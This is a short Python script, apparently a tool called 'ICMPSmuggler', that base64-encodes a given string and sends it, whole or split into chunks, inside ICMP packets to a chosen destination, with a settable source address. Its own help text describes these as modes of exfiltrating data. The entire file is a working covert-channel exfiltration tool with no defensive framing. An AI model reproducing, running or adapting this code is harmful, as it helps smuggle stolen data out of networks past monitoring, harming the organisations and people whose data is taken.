import sys
import base64
import argparse
from scapy.all import Ether, IP, ICMP, sr1, Raw

def encodeData(input, type="b64"):
    if type == "b64":
        return base64.b64encode(str.encode(input))

def sendPayload(src, dst , payload):
    p = sr1(IP(dst=dst , src=src)/ ICMP() / (payload))
    if p: 
        p.show()

def splitPayload(encodedPayload, chunks):
    # if the chunks > size of the encoded payload
    if int(chunks) > len(encodedPayload):
        chunks = 1
    sizePerChunk = len(encodedPayload) // int(chunks)  # Use integer division to avoid float division
    payloads = []
    for i in range(0, len(encodedPayload), sizePerChunk):  # Iterate over the payload with step equal to sizePerChunk
        payloads.append(encodedPayload[i:i+sizePerChunk])  # Append each chunk to the payloads list
    return payloads


def initialiseParser():
    parser = argparse.ArgumentParser(
        prog="ICMPSmuggler",
        description="Smuggling data through ICMP"
    )
    
    parser.add_argument('-s', '--src', required=True)
    parser.add_argument('-d', '--dst', required=True)
    parser.add_argument('-p', '--payload', required=True)
    parser.add_argument('-t', '--type', choices=["lump", "staggered"] , help="Mode of exfiltrating data: \n lump: one shot send all \n staggered: send in x intervals ")
    parser.add_argument('-c', '--chunks', help="Use to dictate the number of chunks")
    parser.add_argument('-e', '--enc', default='b64')
    return parser


def main(): 
    
    # intialise parser and extract out info
    parser = initialiseParser()
    args = parser.parse_args()
    

    if args.type == "staggered":
        if not args.chunks: 
            parser.error("--interval is required when --type is set to staggered")
        
        encodedPayload = encodeData(args.payload, args.enc)
        splittedPayloads = splitPayload(encodedPayload, args.chunks)
        for i in splittedPayloads: 
            sendPayload(args.src, args.dst, i)
   
    if args.type == "lump":
        encodedPayload = encodeData(args.payload, args.enc)
        sendPayload(args.src, args.dst, encodedPayload)
    

if __name__ == "__main__":
    main()
